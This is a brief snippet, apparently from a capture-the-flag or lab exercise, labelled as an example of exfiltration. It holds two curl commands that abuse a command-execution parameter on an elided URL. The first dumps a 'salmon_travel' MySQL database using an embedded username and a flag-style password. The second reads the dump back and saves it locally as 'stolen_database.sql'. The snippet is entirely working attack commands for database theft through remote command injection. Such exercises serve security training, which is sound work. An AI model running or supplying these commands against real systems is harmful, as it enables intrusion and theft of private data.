# Example of possible exfiltration
curl "...?cmd=mysqldump+-u+salmon_admin+-pFLAG_SalmonDatabaseCredentials+salmon_travel+>+/tmp/dump.sql"
curl "...?cmd=cat+/tmp/dump.sql" > stolen_database.sql